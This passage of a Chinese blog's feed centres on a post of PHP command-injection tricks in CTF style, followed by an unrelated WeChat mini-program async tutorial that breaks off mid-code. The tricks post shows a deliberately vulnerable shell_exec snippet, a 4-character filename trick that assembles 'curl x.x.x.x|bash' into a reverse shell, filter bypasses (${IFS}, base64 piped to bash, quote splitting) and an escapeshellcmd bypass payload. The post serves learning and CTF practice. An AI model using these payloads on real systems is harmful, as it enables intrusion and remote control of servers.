&lt;p&gt;以下对2017年的Top 10版本做一个归纳，例子中不全的欢迎各位大佬评论指出，后续有会添加上。&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="Owasp" scheme="https://www.extrader.top/tags/Owasp/"/>
    
  </entry>
  
  <entry>
    <title>php命令执行小技巧</title>
    <link href="https://www.extrader.top/posts/45c7e77/"/>
    <id>https://www.extrader.top/posts/45c7e77/</id>
    <published>2020-08-14T02:55:31.000Z</published>
    <updated>2020-09-06T16:08:26.802Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-GxNoCndt" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="115162" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h2 id="突破命令长度限制"><a href="#突破命令长度限制" class="headerlink" title="突破命令长度限制"></a><strong>突破命令长度限制</strong></h2><p>限制条件：长度<strong>&lt;=4</strong></p><p>限制代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hack!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><p>先看效果图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814204553709.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>&gt;</code>后面跟的文件名，可以生成一个以这个字符串命名的文件</li><li><code>*</code>可以将文件名（按首字母排序）列出来当一行命令执行</li><li><code>*v</code>匹配当前目录下以<code>v</code>结尾的的文件名，<code>*v</code>=<code>rev v</code>，输出<code>v</code>文件内容里面内容的反序结果，<code>&gt;cat|*t</code>同理</li><li><code>dir a b&gt;c</code>只会将<code>a b</code>写到文件<code>c</code>中</li></ol><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h3><p>先看效果图：</p><p>获取<code>ls -th &gt;g</code>命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814220444746.png" alt loading="lazy"></p><p>获取<code>curl x.x.x.x|bash</code>命令</p><p><code>&gt;cu\\</code>这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入<code>\\</code>产生<code>\</code>，但是<code>php</code> 代码<code>exec</code>时，只需要输入<code>\</code>即可产生<code>\</code>，比如 <code>exec(&quot;&gt;cu\&quot;)</code>即可。所以这里实际上是不超过4个字符的，为了演示直观，在<code>shell</code>中直接执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814223956562.png" alt loading="lazy"></p><p>执行结果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814221328388.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>ls -t</code>按时间顺序排列文件，<code>ls -th</code>不影响命令执行，为了让倒序的时候<code>ht-</code>在<code>sl</code>前面</li><li><code>\</code>  <code>linux</code>下行末加上<code>\</code>会将该行末尾与下一行行首连接起来，简单来说应该是删掉了换行符</li></ol><p>这里需要注意，文件名中不能包含<code>/</code>这个符号的，所以需要将反弹shell的服务器根目录下默认网页设置成curl下反弹shell的命令的网页</p><p>例如我ubuntu服务器的Apache默认网页设置在<code>/etc/apache2/mods-available/dir.conf</code>中，编辑如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814225408259.png" alt loading="lazy"></p><p>1.txt中为反弹shell的命令，这样即可成功执行</p><p>或者你改index.html的内容也行</p><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h2><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>php下可以cat%09/flag<span class="token operator">&lt;></span>linux@Extrader:/var/www/html$ cat<span class="token operator">&lt;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">拼接linux@Extrader:/var/www/html$ <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>/flag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>base64编码linux@Extrader:/var/www/html$ <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token variable">`</span></span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>单引号、双引号linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">""</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">''</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>反斜线 <span class="token punctuation">\</span>linux@Extrader:/var/www/html$ ca<span class="token punctuation">\</span>t /fl<span class="token punctuation">\</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flag   <span class="token comment"># 连接文件并打印到标准输出设备上</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">rev</span> /flag   <span class="token comment"># 将文件内容以字符为单位反序输出</span><span class="token punctuation">&#125;</span>e32de3e34-g45t4d2-45gt532-34f32e3<span class="token punctuation">&#123;</span>galflinux@Extrader:/var/www/html$ <span class="token function">more</span> /flag  <span class="token comment"># 显示文件内容，每次显示一屏</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tail</span> /flag  <span class="token comment"># 在屏幕上显示指定文件的末尾若干行</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">less</span> /flag  <span class="token comment"># 分屏上下翻页浏览文件内容</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">head</span> /flag  <span class="token comment"># 在屏幕上显示指定文件的开头若干行</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tac</span> /flag   <span class="token comment"># 将文件以行为单位的反序输出</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">sort</span> /flag  <span class="token comment"># 将文件进行排序并输出</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">nl</span> /flag    <span class="token comment"># 在Linux系统中计算文件内容行号</span>     <span class="token number">1</span>  flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ hexdump /flag  <span class="token comment">#显示文件十六进制格式</span>0000000 6c66 <span class="token number">6761</span> 337b <span class="token number">3265</span> <span class="token number">6633</span> <span class="token number">3334</span> 322d <span class="token number">3533</span>0000010 <span class="token number">6774</span> <span class="token number">3435</span> 322d <span class="token number">3464</span> <span class="token number">3574</span> <span class="token number">6734</span> 342d <span class="token number">6533</span>0000020 <span class="token number">6533</span> <span class="token number">3264</span> <span class="token number">6533</span> 0a7d0000028linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fl*flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fla?flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a><strong>绕过escapeshellcmd</strong></h2><p>测试代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dir '</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$escaped_command</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">,</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p><p>payload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">dir</span><span class="token operator">=</span>. %1a <span class="token function">whoami</span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><ul><li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">来自小密圈里的那些奇技淫巧</a></li><li><a href="https://www.mi1k7ea.com/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="https://www.freebuf.com/articles/web/154453.html">挖洞经验|命令注入突破长度限制</a></li><li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-GxNoCndt&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;115162&quot; data-server=&quot;netease&quot; data-type=&quot;song&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="命令执行" scheme="https://www.extrader.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序有关异步问题的一些操作</title>
    <link href="https://www.extrader.top/posts/80b70afe/"/>
    <id>https://www.extrader.top/posts/80b70afe/</id>
    <published>2020-08-13T12:55:31.000Z</published>
    <updated>2020-08-14T08:04:36.698Z</updated>
    
    <content type="html"><![CDATA[<p>方法不唯一，后续有新方法再补上~</p><span id="more"></span><h3 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关于<code>promise</code>  具体可参考阮老师的<a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></p><p>或者直接</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="同步化异步函数"><a href="#同步化异步函数" class="headerlink" title="同步化异步函数"></a>同步化异步函数</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.js使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><h3 id="wx-request请求封装"><a href="#wx-request请求封装" class="headerlink" title="wx.request请求封装"></a>wx.request请求封装</h3><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p><code>api/index.js</code>封装</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token 